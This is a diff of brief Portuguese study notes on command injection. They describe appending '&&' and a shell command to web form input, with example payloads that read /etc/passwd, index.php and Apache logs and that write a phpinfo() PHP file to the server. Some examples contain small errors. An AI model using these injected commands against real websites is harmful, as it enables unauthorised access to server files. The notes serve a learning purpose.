@@ -1,9 +1,13 @@
+apt-get update 
+
 - > Command Injection
 	
 	- Assim como a injeção SQLinjection e XSS que verificam os parâmetros de entrada para obter informações sobre banco de dados os formularios também 
 	são vulneraveis a injeções de entrada. 
 	exemplos: 
 		A técnica utilizada é fazer uma requisição normal ao site "xxx" somado ( junção )  "&&" e em seguida uma comando "ls", "/etc/passw", etc...  
+		
+		xxx && echo teste.php	(criando pasta teste.php) 
 		xxx && cat index.php				' 	
 		xxx && cat cat /etc/passwd	 		''
 		xxx && cat /var/log/apache2/error.log		"
@@ -25,3 +29,5 @@
 	
 	pode-se fazer também: 
 	xxx && echo "<?php phpinfo(); ?>" > pasta.php pra obter informações do servidor no navegador 
+
+	
